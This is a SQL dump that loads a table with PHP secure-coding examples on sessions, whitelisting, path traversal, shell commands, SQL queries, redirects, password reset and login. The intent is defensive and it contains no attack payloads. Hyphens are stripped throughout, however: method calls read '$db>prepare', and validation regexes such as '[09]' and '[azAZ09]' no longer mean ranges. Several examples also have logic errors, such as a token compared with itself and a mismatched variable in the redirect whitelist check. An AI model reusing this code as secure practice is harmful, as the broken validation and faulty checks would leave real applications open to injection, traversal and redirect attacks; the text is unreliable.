		$lifetime = 3600; // < lifetime of a session
		$path     = "/";
		$domain   = "www.example.com";
		$secure   = 0;
		$httponly = true;

		session_set_cookie_params($lifetime, $path, $domain, $secure, $httponly);

	}

	/*
	You could also set the session cookie its secure function with a ini_set
	This ini_set has to be included in the header of al your pages in order to work
	*/

	ini_set(''session.cookie_lifetime'', 3600);

    ?>
', 'Timeout a session', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Whitelisting


 Example:


    <?php

	class whitelisting{

		/*
		First we create a function which checks the allowed patterns:
		checkpattern("value1,value2,value3" , $input, "3")
		*/
			function checkpattern($allowed, $input, $countLevel){

			$logging = new logging();
			$result  = explode("," , $allowed);

			$results = false;

			foreach($result as $pattern){
				while(preg_match("/^".$pattern."$/", $input)){		
					//If the value is valid we send a log to the logging file.        
					$logging>setLog($_SESSION[''userID''],"Good whitelist validation",
					"SUCCESS", date("dmy"),"null", "HIGH");

					$results = true;

					//Whenever there was a valid match we return true      			
					return true;
				}
			}

			//Check for a false in order to send error to log and counter the user.
			if($results == false){
				//If the value is invalid we send a log to the logging file.        
				$logging>setLog($_SESSION[''userID''],"Bad whitelist validation",
				"FAIL", date("dmy"), $_SESSION["privilege"], "HIGH");

				$logging>setCounter($countLevel);
				return false;		
			}
		}
	}

    ?>
', 'White listing', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Session hijacking and fixation


 Example:


   	<?php

	/*
	As soon as a user logs into your application you must store his session id as well as his
	IP address along with his userID. This information will be used later on in your application in order to
	identify possible session hijacking.

	TABLE track_sessions
	
	| TrackID | userID |		   	   SESSION 	                |   Ip address	    |
	
	|   1     | 1      | 	79dcd529c0f5e01a9bfb2425c52036c6    |	123.45.67.89    |   
	
	|   2     | 1      | 	79dcd529c0f5e01a9bfb2425c52036c6    |	123.45.67.81    |
	
	|   3     | 2      | 	c80959d3ea4c166413774e45375ac2a1    |	987.65.43.21    |
	

	In order to prevent session hijacking there are a couple of defense strategies
	which combined are a hardened defense.  
	*/

	/*
	First we implement the strict transport security header, this is in order to prevent
	users from accessing your application over an unprotected connection.
	*/

	//Example of the strict transport security header:
	header(''StrictTransportSecurity: maxage=31536000'');


	//If all present and future subdomains will be HTTPS:
	header(''StrictTransportSecurity: maxage=31536000; includeSubDomains'');

	/*
	Recommended: If the site owner would like their domain to be included in the HSTS preload
	list maintained by Chrome (and used by Firefox and Safari), then use:
	*/

	header(''StrictTransportSecurity: maxage=31536000; includeSubDomains; preload'');

	/*
	The `preload` flag indicates the site owner''s consent to have their domain preloaded.
	The site owner still needs to then go and submit the domain to the list. the preload list
	enforces the browser to always present your application on HTTPS even on the first time
	the user hits your application
	*/

	/*
	Then we set the httpOnly flag
	(see "HttpOnly" in the code examples for more details about implementation)
	*/
	ini_set(''session.cookie_httponly'', 1);

	/*
	Then we set the flag for session timeout
	(see "Timeout" in the code examples for more details about implementation)
	*/
	ini_set(''session.cookie_lifetime'', 3600);

	/*
	Then we set the session secure flag
	(see "Secure flag" in the code examples for more details about implementation)
	*/
	ini_set(''session.cookie_secure'', 1);

	/*
	On login we change the session id in order to prevent session fixation
	(see "Login functionality" in the code examples for more details about implementation)
	*/
	session_regenerate_id(true);

	/*
	NOTE: On applications that require high level security, there should never be an
	remember me functionality implemented.
	*/


	/*
	Now imagine the scenario after the login of the user (see the "login functionality" in
	the code examples for more details). Whenever the user is logged in, the users IP address
	and session id are also stored in the database these values are used in order to verify
	if there are multiple users active on the same session.
	If so, we can let the user decide to terminate the session and terminate the
	other assigned sessions.
	*/
	class sessionCheck{
			//We implement this logic into our checksession functionality
			public function _checkSession(){

			//init a DB connection
			include("classes.php");
			$con = new database();
			$db = $con >connection()

			//Here we check for a valid session to see if the user is authenticated
			session_start();
			if(($_SESSION[''access''] != "active") || $_SESSION[''access''] == ""){
				header("Location: /login");

				/*
				this statement ABSOLUTELY MUST DIE or else an attacker could gain knowledge and abuse
				all your pages and functionality simply by intercepting the response
				from the server when connection to your pages.
				*/

				die();
			}

			/*
			Then we start the rest of the function where we will check if there are multiple
			users/IP addresses using the same session id
			*/

			//store current session id
			$session  = session_id();

			//get users ip address
			$ipaddress = $_SERVER[''REMOTE_ADDR''];

			$stmt = $db>prepare("SELECT * FROM track_sessions WHERE userID=:id");
			$stmt>execute(array('':id'' => $_SESSION[''userID'']));
			$rows = $stmt>fetchAll(PDO::FETCH_ASSOC);

				foreach($rows as $row){

					//check to see if the current ip address matches the one stored in login if not warn user!
					if(($ipaddress != $row[''ipaddress'']) && $row[''SESSION''] != $session){

						echo "
						<div style=''borderstyle:solid; bordercolor:black; color:white; backgroundcolor:red; float:left;''>
						<p>There are other active sessions on other IPaddresses.<br/>
						Your session could be hijacked press logout in order to authenticate again
						for security reasons!
						<br/><br/>
						<a href=''/logout''>Terminate sessions</a>
						<br/>
						<a href=''/Proceed''>Proceed anyway</a>
						</p>
						</div>
						";				
				}
			}			
		}
	}

	/*
	the only thing left to do now is to update your track_sessions table by inserting
	the IP address, sessionID and userID if you want to accept the other sessions as valid.
	Otherwise the user just has to terminate his current session in order to lock out the
	other sessions.
	*/

    ?>
', 'Session hijacking and fixation', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Random password/token generation


 Example:


    <?php

	//A good random token example for tokens would be:
	$_SESSION[''csrf''] = base64_encode(openssl_random_pseudo_bytes(128));

	//A good random password would be:
	$bytes = openssl_random_pseudo_bytes(15);
	$pwd = bin2hex($bytes);

	/*
	When needing to generate random numbers, always use proven methods
	instead of writing your own.
	*/

	  ?>
', 'Random password token generation', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Directory/path traversal


 Example:


	<?php

	class fileGetContents{ 	
		/*
		Define the whitelist pattern and validation type and input parameter, countLevel like:
		getFiles("page1,page2,etc", "alphanumeric", $_GET[''filename''], "3")
		*/
		public getFiles($whiteListPattern, $validationType, $inputParameter, $countLevel){

			//Include the classes of which you want to use objects from
			include_once("classes.php");

			$validate  = new validation();
			$whitelist = new whitelisting();

			$continue = true;

			/*
			First, we want to filter the filenames for expected values. For this example we use only az/09
			Whenever the values are tampered with, we can assume an attacker is trying to inject malicious input.
			for more information about validation see "input validations" in the code examples:
			*/
			if($validate>inputValidation($inputParameter, $validationType,
			"Invalid user input", "HIGH", $countLevel) == false) {$continue = false;}

			/*
			Second, we want to whitelist the filenames for expected values, in this example they are,
			page1,page2 etc.. for more information about whitelisting see "whitelisting" in the code examples:
			*/
			if($whitelist>checkpattern($whiteListPattern, $inputParameter, $countLevel) == false)
			{$continue = false;}

			//If all went good we include the filename
			if($continue == true){
				include($inputParameter);
			}
		}
	}
	?>
', 'Directory path traversal', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' input validation


 Example:


    <?php

	/*
	This function is where you store al your input validation controls.
	It makes it easy to maintain whenever you want to apply changes for
	certain input validation roles and reduces the chance of mistakes in your regexes.
	*/

	class validation{

		//Our input validation function
		public function inputValidation($input, $type, $logMessage, $threatLevel, $countLevel){

			//Audit log and user lockdown
			$logging = new logging();

			switch ($type) {
				case "numeric":
					$pattern = "/^[09]+$/";
					break;
				case "alphanumeric":
					$pattern = "/^[azAZ09]+$/";
					break;
			}

			if(!preg_match($pattern, $input)){

				/*
				Set a log for whenever there is unexpected user input with a threat level
				See "audit logs" code example for more information:
				*/
				$logging > setLog($_SESSION[''userID''], $logMessage, "FAIL", date("dmy"),
				$_SESSION["privilege"], $threatLevel);

				/*
				Set counter if counter hits 3 the users session must terminated
				After 3 session terminations the user account must be blocked
				See "audit logs" code example for more information:
				*/			
				$logging>setCounter($countLevel);

				return false;
				}else{

				//Set a log for whenever there is unexpected userinput with a threat level
				$logging>setLog($_SESSION[''userID''],"Valid input validation for regex from ".$type." ",
				"SUCCESS", date("dmy"), $_SESSION["privilege"], "NONE");

				return true;
			}
		}
	}

    ?>
', 'Input validation', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Enforce sequential step order (Shopping)


 Example:


    <?php

	/*
	Whenever an functionality consists out of following several steps to achieve some goal i.e,
	"User adds items to chart", "User enters shipping information", "User pays for goods",
	"Items will be shipped." You want to make sure the user can not skip the payment step in
	order to receive his goods.


		    
	| Items  |	|  Cart	 |	|checkout |	 | CostumerInfo	|
		  	 
	|itemID  |	|cartID  |	|PaymentID|  |ConsumerID    |
	|price	 |	|itemID  |	|itemID   |	 |name          |
	|name  	 |	|sessionID|	|Token    |	 |address	    |
		  |sessionID|  |sessionID   	|
							|Verified |  |consumerToken |
							 	 		

	As you can see above we have a very simplified database structure for your average
	web shop. now we can walk through the different steps needed to enforce the user to take
	all steps before payment.

	We wont cover the entire shopping cart functions since that would become a rather big
	example so let''s cover the basics of enforcing the sequential steps.

	Step1: would be, the user adding items to his cart.

	Step2: would be, the user adding his items to checkout. Whenever he is done shopping
			"add to checkout" generates a random token for the added items which
			are inserted into the payment table in the database


	*/

	//First we build the checktokens function because we want to check the checkout tokens
	//multiple times throughout the steps
	function checkTokens(){
		$stmt = $db>prepare("SELECT * from checkout where sessionID=? ");
		$stmt>execute(array(session_id()));
		$rows = $stmt>fetchAll(PDO::FETCH_ASSOC);

		foreach($rows as $row){

			//Here we check for a different token or new session token
			if(($row[''token''] != $row[''token'']) && ($row[''token''] != $_SESSION[''token''])){

				$stmt = $db>prepare("DELETE FROM customerinfo WHERE sessionID=:id");
				$stmt>execute(array(session_id()));
				$affected_rows = $stmt>rowCount();

				$stmt = $db>prepare("DELETE FROM checkout WHERE sessionID=:id");
				$stmt>execute(array(session_id()));
				$affected_rows = $stmt>rowCount();

				header(''location:checkout.php'');
			}
		}
	}

	//note: As soon as the user visits your website you start sessions in order to assign phpsessionID

	//A random token for every time the form loads
	$token = base64_encode(openssl_random_pseudo_bytes(128));

	/*
	We create a session with the token, if someone adds new items to the checkout this
	token will change and will intercept attackers tampering the system.
	*/


	?>

	<form methods="post">
	<input type="hidden" name="token"  value="<?php echo $token; ?>"/>
	<input type="submit" name="submit" value="add to checkout"/>
	</form>


	<?php

	//On submit we create a new session for the token
	if(isset($_POST[''submit'']){
		$_SESSION[''token''] = $token;
	}

	/*
	On submit we send al the shopping cart data to another table in the database, but
	this time al the items also contain the same random token. Now an attacker cannot sneak
	in new items since these tokens will be evaluated on the payment page.

	next, the user lands on a page where he has to fill in his customer info:

	NOTE: do not forget the CSRF token in order to prevent attackers from changing his
	shipping info.
	*/

	//First we check the checkout tokens to see if no new items where added.
	checkTokens();

	?>

	<form methods="post">
	<input type="text"   name="customerName" />
	<input type="text"   name="CustomerAddress" />
	<input type="submit" name="submit" value="to payment"/>
	<input type="hidden" name="token"  value="<?php echo $_SESSION[''csrf'']; ?>"/>
	</form>

	<?php

	//After submit we first of course check the CSRF token for validity

	checkCsrf($_POST[''token'']);

	//Check the checkout tokens to see if no new items where added
	checkTokens();  

	//than we proceed to check if the post values where not empty
	$errors = array();
	$check = true;

	if(empty($_POST[''customerName''])){
			$check = false;
			array_push($errors, "Customer name is required");
		}

		if(empty($_POST[''customerAddress''])){
			$check = false;
			array_push($errors, "Customer address is required");
		}

		if(!$check){
			echo $errors;
		}
		else{

			header(''location:summary.php'');
			//In this step we also insert al the customer data into the database.
		}

	/*
	Then we select al the customer info and shopping items on sessionID from the
	database and display it on screen in order for the user to verify if all the
	information displayed is correct.
	*/

	//when the user has verified we again check the checkout tokens to see if no new items where added
	checkTokens();    

	/*
	After that the user verifies this information then he will be redirected to the payment
	page like ideal, Paypal etc.

	Whenever the payment returns true you set the "verified" column on the checkout
	table to TRUE and you send the customer the invoice and send him his items.
	*/


	$verified = "true";
	$stmt = $db>prepare("UPDATE checkout SET verified=? WHERE sessionID=? and token=?");
	$stmt>execute(array($verified, session_id(), $_SESSION[''token'']));
	$affected_rows = $stmt>rowCount();

	//also in this step we clear al the db items matching to the phpsessionid
	$stmt = $db>prepare("DELETE FROM customerinfo WHERE sessionID=:id");
	$stmt>execute(array(session_id()));
	$affected_rows = $stmt>rowCount();

	$stmt = $db>prepare("DELETE FROM checkout WHERE sessionID=:id");
	$stmt>execute(array(session_id()));
	$affected_rows = $stmt>rowCount();

	$stmt = $db>prepare("DELETE FROM cart WHERE sessionID=:id");
	$stmt>execute(array(session_id()));
	$affected_rows = $stmt>rowCount();

	*/

    ?>
', 'Enforce sequential step order shopping', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' System commands


 Example:


    <?php

	class systemCommands{ 	

		/*
		Define the whitelist pattern and validation type and input parameter like:
		getFiles("value1,value2,etc", "alphanumeric", $_GET[''filename''], "3")
		*/
		public function command($whiteListPattern, $validationType, $inputParameter){

			//Here we include al the necessary classes like audit logs, whitelisting and validation:
			include("classes.php");

			$validate  = new validation();
			$whitelist = new whitelisting();

			$continue = true;

			/*
			Whenever a system command is finished, you should properly sanitize and escape this user input.
			System command functions examples are: system(), eval(), exec()

			First, we want to filter the filenames for expected values. For this example we use only az/09
			Whenever the values are tampered with, we can assume an attacker is trying to inject malicious input.
			for more information about validation see "input validations" in the code examples:
			*/

			if($validate>inputValidation($inputParameter, $validationType,
			"Invalid user input for system commands", "HIGH", $countLevel) == false) {$continue = false;}

			/*
			Second, we want to whitelist the filenames for expected values, in this example they are,
			page1,page2 etc.. for more information about whitelisting see "whitelisting" in the code examples:
			*/

			if($whitelist>checkpattern($whiteListPattern, $inputParameter, $countLevel) == false)
			{$continue = false;}

			//If all went good we include the filename
			if($continue == true){

				//Even though there is a match we still escape the shellcommand:
				$command = ''./configure ''.$inputParameter;
				$escaped_command = escapeshellcmd($command);
				//Only after validation do we put the shellcommand into the system() function:
				system($escaped_command);
			}
		}
	}
    ?>
', 'System commands', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Session cookies HttpOnly


 Example:


    <?php

	//Whenever a session is started, the "httpOnly" option should always be set to "true" or "1":

	public function sessionStart(){

		$lifetime = 3600;
		$path     = "/";
		$domain   = "www.example.com";
		$secure   = 0;
		$httponly = true; // <  the httponly flag

		session_set_cookie_params($lifetime, $path, $domain, $secure, $httponly);
	}

	/*
	You could also set the session cookie its httpOnly function with a ini_set
	This ini_set has to be included in the header of al your pages in order to work
	*/

	ini_set(''session.cookie_httponly'', 1);

	?>
', 'Session cookies HttpOnly', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' SQL query


 Example:


    <?php

	/*
	This example uses a prepared statement in order to insert data into the database.
	Because this method enforces the user to prepare all user input  passed into the query, it always escapes SQL
	injections so none could be accidentally forgotten as with the normal mysqli_real_escape_string() methods.
	*/

	$stmt = $db>prepare("SELECT * FROM table WHERE id=? AND name=?");
	$stmt>execute(array($id, $name));
	$rows = $stmt>fetchAll(PDO::FETCH_ASSOC);

	//or		

	$stmt = $db>prepare("UPDATE table SET name=? WHERE id=?");
	$stmt>execute(array($name, $id));
	$affected_rows = $stmt>rowCount();

	//or

	$stmt = $db>prepare("DELETE FROM table WHERE id=:id");
	$stmt>bindValue('':id'', $id, PDO::PARAM_STR);
	$stmt>execute();
	$affected_rows = $stmt>rowCount();

	//or

	$stmt = $db>prepare("INSERT INTO table(field1,field2) VALUES(:field1,:field2)");
	$stmt>execute(array('':field1'' => $field1, '':field2'' => $field2));
	$affected_rows = $stmt>rowCount();

	/*
	All methods will prevent SQL injections.
	The less recommended option for preventing sql injections is to use the mysqli_real_escape_string() function.
	*/

	$username = mysqli_real_escape_string($connectionString, $_POST[''username'']);
	$email    = mysqli_real_escape_string($connectionString, $_POST[''email'']);

	mysqli_query($connectionString, "INSERT INTO users (username, email) VALUES ("''.$username.''", "''.$email.''")");

	/*
	NOTE: mysqli_real_escape_string() will _not_ work when escaping integers since the function only
	escapes strings. In order to prevent all SQL injection vulnerabilities, we strongly recommend
	using prepared statements
	*/

    ?>
', 'SQL query', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Open forwards & redirects


 Example:


   	<?php

	/*
	When using forwards & redirects you should make sure the URL is being explicitly
	declared in the code and cannot be manipulated by an attacker like:
	*/

	header("location:redirectpage.php");

	/*
	Generally you should avoid getting input into the redirect which could contain
	userinput by any means. if for any reason this may not be feasible than you
	should make a whitelist input validation for the redirect like so:
	send("value1,value2,etc", $_GET[''redirectParam''], "3")
	*/

	class redirecting{
		public function send($whiteListing, $inputParam, $countLevel){

			//Include the classes of which you want to use objects from
			include_once("classes.php");

			$whitelist = new whitelisting();

			/*
			We want to whitelist the paged for expected values, in this example they are,
			page1,page2 etc.. for more information about whitelisting see "whitelisting" in the code examples:
			*/
			if($whitelist>checkpattern($whiteListing, $inputParameter, $countLevel) == true){
				header("location:".$inputParam."");
			}			
		}
	}

    ?>
', 'Open forwards & redirects', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Xpath query


 Example:

	
    <?php

	class xPathControl{ 	

		/*
		Define the allowed characters and input parameter and count level for the
		user lockout like:
		controller("<''>&", $_GET[''filename''], "3")
		*/
		public function controller($allowedCharacters, $inputParameter, $countLevel){

			//Include the classes where you want to make objects of:		
			include("classes.php");
			$encode = new encodeInput();

			/*
			First we build our encoding method, see "input validation" code example for
			more detailed information about encoding and escaping.
			*/

			$return = $encode>encoder($allowedCharacters, $inputParameter, $countLevel);

			//If the encoder came back false we do not process the function!
			if($return !== false){
				//start a new domdocument

				$xmldoc = new DOMDocument();
				$xmldoc>load(''test.xml'');

				$xpathvar = new Domxpath($xmldoc);

				/*
				Assuming that you used the encoder function also for adding users, it will now retrieve the
				user O''Reilly from the query
				*/

				$queryResult = $xpathvar>query(''//lemonade[@supplier="''.$return.''"]/price'');

				foreach($queryResult as $result){
						echo $result>textContent;
				}
			}
		}
	}
    ?>
', 'X path query', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Anticaching headers


 Example:


	<?php

	/*
	Add the following headers to your application head in order to prevent the browser from caching
	*/

	header("CacheControl: nostore, nocache, mustrevalidate"); // HTTP/1.1
	header("CacheControl: postcheck=0, precheck=0", false);
	header("Pragma: nocache"); // HTTP/1.0

	?>
', 'Anti caching headers', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Secure session cookies


 Example:


    <?php

	/*
	Whenever  a cookie is sent over a secured connection, the cookie should be set
	with the secure flag, in order to guarantee the integrity of the data it contains.
	The secure flag is set by giving it the "true" or "1" value:
	*/

	public function sessionStart(){

		$lifetime = 3600;
		$path     = "/";
		$domain   = "www.example.com";
		$secure   = true; // < the secure flag
		$httponly = true;

		session_set_cookie_params($lifetime, $path, $domain, $secure, $httponly);
	}

	/*
	You could also set the session cookie its secure function with a ini_set
	This ini_set has to be included in the header of al your pages in order to work
	*/

	ini_set(''session.cookie_secure'', 1);

  	?>
', 'Secure session cookies', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Crossdomain.xml


 Example:

    			
		// A bad example of a crossdomain.xml would be:
		
		<?xml version="1.0" ?>
		<crossdomainpolicy>
			<sitecontrol permittedcrossdomainpolicies="masteronly"/>
			<allowaccessfrom domain="*"/>
			<allowhttprequestheadersfrom domain="*" headers="*"/>
		</crossdomainpolicy>

		// Because it allows access from all other domains.
		// Instead of this approach you might want to use the following restrictions.
		// Example by twitter''s crossdomain.xml:

		<?xml version="1.0" encoding="UTF8"?>
		<crossdomainpolicy xmlns:xsi="http://www.w3.org/2001/XMLSchemainstance" xsi:noNamespaceSchemaLocation="http://www.adobe.com/xml/schemas/PolicyFile.xsd">
			<allowaccessfrom domain="twitter.com" />
			<allowaccessfrom domain="api.twitter.com" />
			<allowaccessfrom domain="search.twitter.com" />
			<allowaccessfrom domain="static.twitter.com" />
			<sitecontrol permittedcrossdomainpolicies="masteronly"/>
			<allowhttprequestheadersfrom domain="*.twitter.com" headers="*" secure="true"/>
		</crossdomainpolicy>
', 'Crossdomain.xml ', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Password forget & Disallow old passwords


 Example:


    <?php

	/*
	Whenever you are developing a password forget function, these are the steps to follow
	in order to create hardened defenses.

	TABLE users
	
	| userID | userName | password |   EmailAddress	 |    access    |
	   
	|   1    | Admin    | Csdar323 | info@admin.com	 | 	   TRUE	    |
	    	
	|   2    | User	    | Adf4fsv  | info@user.com   |	   FALSE    |
	    
	|   3    | Guest    | dff4fKr  | info@guest.com	 |	   TRUE	    |
	    


	TABLE passwordForget
	   
	| forgotPasswordID | 		Token 	         | 	UserID |   Active	|	  olPasswords   |
	
	|      1           | 	c3ab8ff13720e....	 |	  1	   | 	YES	    |	   Csdar323	    |
	
	|	   2  	       | 	7dd39466b3c89....	 |	  1	   | 	NO	    |		ef0c4f2	    |
	
	|	   3 	       | 	83d4a3960714c....	 |	  3	   | 	NO	    |		dff4fKr	    |
	


	As you can see we also store the old passwords into the password forget table, this
	we do in order to prevent the user from using old passwords later on in the process.

	Also use a cron job to make sure the generated tokens for the password reset are
	expire after a certain amount of time like 20 minutes.
	*/

	class passwordForget{
		public function checkValidity(){

			//init a DB connection
			include("classes.php");
			$con = new database();
			$db = $con >connection()

			$stmt = $db>prepare("SELECT * FROM members WHERE email=?");
			$stmt>execute(array($_POST[''email'']));
			$rows = $stmt>fetchAll(PDO::FETCH_ASSOC);

			foreach($rows as $row){
				//Here we select the old password as well as the userid from the members table
				$password = $row[''password''];
				$userID   = $row[''id''];
				$email 	  = $row[''email''];
			}

			//If the select was not empty we will be sending an email to the user as well as
			//preparing the password forget function
			if(!empty($rows)){

				echo "An email was sent to your email for password reset";

				/*
				Before we do anything we first set all other possible active statuses to NO
				in order to prevent an attacker creating a whole lot of tokens and than fuzz
				the password reset token.
				*/

				$active = "NO";
				$stmt = $db>prepare("UPDATE forgetPassword SET active=? WHERE userID=?");
				$stmt>execute(array($active, $userID));
				$affected_rows = $stmt>rowCount();

				//Here we generate the password forget token
				$bytes = openssl_random_pseudo_bytes(30);
				$token = bin2hex($bytes);

				$stmt = $db>prepare("
				INSERT INTO forgetPassword
					(token, userID, active, oldPasswords)
						VALUES
							(?, ?, ?, ?)");

				$stmt>execute(array(
				$token,
				$userID,
				''YES'',
				$password
				));

				//Here we send an email to the user with the needed reset function
				$msg = "follow this link to reset your password http://example.com/index.php?resetLink=$token";
				mail($email,"Password reset",$msg);
			}else{

				/*
				We show the user the same message in order to prevent the enumeration of
				valid email addresses.
				*/

				echo "An email was sent to your email for password reset";			
			}
		}

		public function resetPassword(){

			//init a DB connection and make objects for hashing and secure password enforcing
			include("classes.php");

			$con  = new database();
			$hash = new passwordHash();
			$pwd  = new passwordPolicy();

			$db = $con>connection()		

			/*
			Imagine the user clicked on his link with the token included and is redirected towards
			the page where he can enter his new password.

			Now we select the information from the forgot password function where the
			forgot tokens matches the token in the database.
			*/

			$active = "YES";

			$stmt = $db>prepare("
			SELECT  a.userID, a.token, b.id
					FROM forgetPassword as a
						JOIN members as b
							ON a.userID = b.id WHERE token=? and Active=? ");

			$stmt>execute(array($_GET[''resetLink''], $active));
			$rows = $stmt>fetchAll(PDO::FETCH_ASSOC);

			foreach($rows as $row){

				//Here we select token and users id:
				$token  = $row[''token''];
				$userID = $row[''userID''];

			}

			if($token === $_GET[''resetLink'']){

				/*
				First we pull the password through our function which enforces the input of
				secure passwords.(see "Enforce secure passwords" in code examples for more
				detailed information)
				*/

				if($pwd>createPassword($_POST[''password'']) === true);

				/*
				Than we encrypt our password
				(see "Password storage" in code examples for more
				detailed information)
				*/

				$hash>createHash($_POST[''password'']);

				/*
				Finally we compare the password against other old passwords from the
				password reset database in order to prevent the user from using old passwords
				which could already be compromised by any means.
				*/

				$stmt = $db>prepare("SELECT oldPasswords FROM forgetPassword where userID=?");
				$stmt>execute(array($userID));
				$rows = $stmt>fetchAll(PDO::FETCH_ASSOC);

				foreach($rows as $row){

					if($newpassword === $row[''oldPasswords'']){
						echo "This was an old password please do not use this password";
					}else{

						//First we update the new password for the user
						$active = "NO";
						$stmt = $db>prepare("UPDATE members SET password=? WHERE userID=?");
						$stmt>execute(array($newPassword, $userID));
						$affected_rows = $stmt>rowCount();

						//Then we destroy the reset token by setting it''s value to NO
						$stmt = $db>prepare("UPDATE forgetPassword SET active=? WHERE userID=?");
						$stmt>execute(array($active, $userID));
						$affected_rows = $stmt>rowCount();

					}
				}
			}
		}
	}

    ?>
', 'Password forget and disallow old passwords', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' XML External entities


 Example:

    
	<?php

	/*
	The overall prevention method for loading external entities is adding the following line of code:
	This line of code function tells the underlying libxml parsing to not try to interpret the values
	of the entities in the incoming XML and leave the entity references intact.
	*/

	libxml_disable_entity_loader(true);

	?>
', 'XML External entities', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Anti clickjacking headers


 Example:

            
    /*
  	One way to defend against clickjacking is to include a "framebreaker" script in each
  	page that should not be framed. The following methodology will prevent a webpage from
  	being framed even in legacy browsers, that do not support the XFrameOptionsHeader.
  	In the document HEAD element, add the following:
  	First apply an ID to the style element itself:
  	*/

  	<style id="antiClickjack">body{display:none !important;}</style>
  	//And then delete that style by its ID immediately after in the script:

	<script type="text/javascript">
	if (self === top) {
		var antiClickjack = document.getElementById("antiClickjack");
		antiClickjack.parentNode.removeChild(antiClickjack);
	} else {
		top.location = self.location;
	}
	</script>


  	<?php
    
  	/*
  	The second option is to use "security headers".
  	There are two options for setting the "anticlickjacking" headers in your application:
  	*/

  	//this will completely prevent your page from being displayed in an iframe.
  	header(''XFrameOptions: DENY'');


  	//this will completely prevent your page from being displayed in an iframe on other sites.
  	header(''XFrameOptions: SAMEORIGIN'');

  	?>
', 'Anti clickjacking headers', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Debug Enabling


 Example:


    <?php

    /*
    Turn off all error reporting, this method should be included on all your pages.
    We recommend putting it in a main method which is used throughout your entire application.
    */
    error_reporting(0);

    //or
    ini_set(''display_errors'',''Off'');

    ?>
', 'Debug enabling', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Login functionality


 Example:


    <?php

	/*
	For privilege based authentication we need an extra table in your database in order to write the users privileges to.

	TABLE users
	    
	| userID | userName | password | privilegeID |    access	| AggregateControl	|
	   
	| 1	     | Admin    | Csdar323 |      1	     | 	 TRUE       |       2336        |
	   	
	| 2      | User	    | Adf4fsv  |      2	     |   FALSE	    |         0	        |
	   
	|	3	     | Guest	  | dff4fKr  |	  3		     |	   TRUE		|		135			          |
	   

	TABLE privileges
	   
	| privilegeID | privilege        |
	
	|     1       | edit:read:delete |
	
	|     2	      | edit:read        |
	
	|     3       | read             |
	

	Now instead of using roles in sessions we rather want to assign privileges to users
	by means of a DatabaseBased Authentication system.
	Now we can easily assign a user certain privileges for him to access.
	See "Privilege based authentication" code example for more information:
	*/

	class login{
		public function loginUser($username,$password)
		{

			//init DB connection
			include("classes.php");
			$conn = new database();
			$db = $con>connection();

			/*
			You must log invalid user input in order to detect a possible attack on your login form
			In this example the expected input is "aZ/09  _"
			*/

			if(preg_match("/[^azAZ09]/", $username))
			{       
				//Set a log for whenever there is unexpected user input with a threat level
				setLog("null","invalid expected input", "FAIL", date("dmy"), "null", "HIGH");
				header("location:login.php");
				die();
			}

			/*
			We also want to make sure the user access is TRUE, if not, it means the user was blocked
			for attempting to hack the application
			*/

			//After successful validation we want to log that username was validated successfully:
			setLog($_SESSION[''userID''],"Username return true", "SUCCESS", date(ddmmyyyy), $privilege, "NULL");

			//PDO prepared statement in order to prevent SQL injections
			$stmt = $db>prepare("
				SELECT a.username, a.password, a.privilegeID, b.privilegeID, b.privilege   
					FROM users as a
						JOIN privileges as b
							ON a.projectID = b.projectID
								WHERE a.username = :username and b.access=''TRUE''");

			$this>_setSql($sql);

			$stmt>execute(array('':page'' => $_GET[''page''], '':username'' => $username));
			$rows = $stmt>fetchAll(PDO::FETCH_ASSOC);

			foreach($rows as $loginUser){

				/*
				Than we validate the password, if the validation is true than we set the sessions
				For more detailed information on password validation check please look into the
				Password storage(salting/stretching/hashing) in the knowledgebase for more information.
				*/
				if($this>ValidatePassword($loginUser[''password''], $password) === true)
				{
					//After successful validation we want to log that Password was validated successfully:
					setLog($_SESSION[''userID''],"Password return true", "SUCCESS", date("dmy"), $privilege, "NULL");

					session_start();

					//Change the session id on login
					session_regenerate_id(true);

					//Here we set a session to see if the user is authenticated throughout the system
					$_SESSION[''access'']   = "active";

					/*
					The userID in a session variable to use as an identifier to prevent a user reading
					into unauthorized data, See Identifierbased authorization for more information and
					code examples.
					*/
					$_SESSION[''userID'']   = $loginUser[''id''];

					//The CSRF token is set here by an approved random number generator
					$_SESSION[''csrf''] = base64_encode(openssl_random_pseudo_bytes(128));

					//if all is ok we return loginUser values
					return $loginUser;
				}
			}
		}
	}

    ?>
', 'Login functionality', 'php'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' User registration / Sql truncation prevention


 Example:


    <?php

	/*
	In order to prevent Column truncation sql injection Solution we have to make sure the
	applications structural logic does not mismatches with the database structural logic.
	To achieve this imagine the follow example of a database structure of a users table

	TABLE users
	
	|	     *Name*        |     *Type*       |    *Extra*     |
	
	|        userID	       |    Int(11)       | AUTO_INCREMENT |
	
	|       Username  	   |    char(21)      |  	           |
	
	|       Password       |  Varchar(255)    |	               |
	
	|      PrivilegeID     |    Int(11)       |                |
	
	*/

	class registerUser{
		//First we create a function in order to select all usernames in order to see of they already exists
		public function userCheck($username){

			//init DB
			$con = new database();
			$db = $con>connection();

			$stmt = $db>prepare("SELECT * FROM members WHERE username = :input");
			$stmt>bindParam('':input'', $username, PDO::PARAM_STR);
